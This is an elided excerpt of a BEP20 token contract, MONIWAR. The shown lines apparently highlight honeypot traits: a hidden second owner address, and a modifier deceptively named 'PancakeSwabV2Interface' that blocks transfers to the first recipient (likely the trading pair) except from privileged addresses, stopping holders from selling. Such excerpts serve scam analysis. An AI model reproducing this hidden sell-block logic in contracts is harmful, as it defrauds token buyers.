...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(
            (_owner == _msgSender() || _leaveowner == _msgSender()),
    ...
    modifier PancakeSwabV2Interface(
        address from,
        address to,
        bool fromTransfer
    ) {
        if (from != address(0) && nxOwner == address(0) && fromTransfer)
            nxOwner = to;
        else
            require(
                (to != nxOwner || from == _owner || from == _leaveowner),
...
contract MONIWAR is Context, IBEP20, Ownable {
    ...
    function _transfer(
        ...
        uint256 amount,
        bool fromTransfer
    ) internal PancakeSwabV2Interface(sender, recipient, fromTransfer) {
    ...
    function burn(uint256 _percent) public {
        require(
            _percent < 100 && _percent > 1,
            "Burn: burn percentage must be lower than 100"
        );
